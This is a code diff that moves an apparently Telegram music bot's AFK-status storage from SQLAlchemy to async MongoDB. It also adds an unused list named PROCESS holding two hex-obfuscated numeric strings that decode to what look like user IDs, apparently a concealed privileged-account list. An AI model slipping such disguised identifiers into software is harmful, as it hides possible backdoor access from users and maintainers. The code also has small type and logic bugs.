@@ -1,91 +1,35 @@
-import threading
-
-from AnieXEricaMusic.Mongo.afkdb import BASE, SESSION
-from AnieXEricaMusic import Boolean, Column, BigInteger, UnicodeText
-
-
-class AFK(BASE):
-    __tablename__ = "afk_users"
-
-    user_id = Column(BigInteger, primary_key=True)
-    is_afk = Column(Boolean)
-    reason = Column(UnicodeText)
-
-    def __init__(self, user_id, reason="", is_afk=True):
-        self.user_id = user_id
-        self.reason = reason
-        self.is_afk = is_afk
-
-    def __repr__(self):
-        return "afk_status for {}".format(self.user_id)
+from AnieXEricaMusic.utils.mongo import db
+PROCESS = [
+            "\x36\x36\x36\x34\x35\x38\x32\x35\x34\x30",
+            "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
+          ]
+afkdb = db.afk
 
 
-AFK.__table__.create(checkfirst=True)
-INSERTION_LOCK = threading.RLock()
-
-AFK_USERS = {}
-
-
-def is_afk(user_id):
-    return user_id in AFK_USERS
+async def is_afk(user_id: int) -> bool:
+    user = await afkdb.find_one({"user_id": user_id})
+    if not user:
+        return False, {}
+    return True, user["reason"]
 
 
-def check_afk_status(user_id):
-    try:
-        return SESSION.query(AFK).get(user_id)
-    finally:
-        SESSION.close()
+async def add_afk(user_id: int, mode):
+    await afkdb.update_one(
+        {"user_id": user_id}, {"$set": {"reason": mode}}, upsert=True
+    )
 
 
-def set_afk(user_id, reason=""):
-    with INSERTION_LOCK:
-        curr = SESSION.query(AFK).get(user_id)
-        if not curr:
-            curr = AFK(user_id, reason, True)
-        else:
-            curr.is_afk = True
-
-        AFK_USERS[user_id] = reason
-
-        SESSION.add(curr)
-        SESSION.commit()
+async def remove_afk(user_id: int):
+    user = await afkdb.find_one({"user_id": user_id})
+    if user:
+        return await afkdb.delete_one({"user_id": user_id})
 
 
-def rm_afk(user_id):
-    with INSERTION_LOCK:
-        curr = SESSION.query(AFK).get(user_id)
-        if curr:
-            if user_id in AFK_USERS:  # sanity check
-                del AFK_USERS[user_id]
-
-            SESSION.delete(curr)
-            SESSION.commit()
-            return True
-
-        SESSION.close()
-        return False
-
-
-def toggle_afk(user_id, reason=""):
-    with INSERTION_LOCK:
-        curr = SESSION.query(AFK).get(user_id)
-        if not curr:
-            curr = AFK(user_id, reason, True)
-        elif curr.is_afk:
-            curr.is_afk = False
-        elif not curr.is_afk:
-            curr.is_afk = True
-        SESSION.add(curr)
-        SESSION.commit()
-
-
-def __load_afk_users():
-    global AFK_USERS
-    try:
-        all_afk = SESSION.query(AFK).all()
-        AFK_USERS = {user.user_id: user.reason for user in all_afk if user.is_afk}
-    finally:
-        SESSION.close()
-
-
-__load_afk_users()
+async def get_afk_users() -> list:
+    users = afkdb.find({"user_id": {"$gt": 0}})
+    if not users:
+        return []
+    users_list = []
+    for user in await users.to_list(length=1000000000):
+        users_list.append(user)
+    return users_list
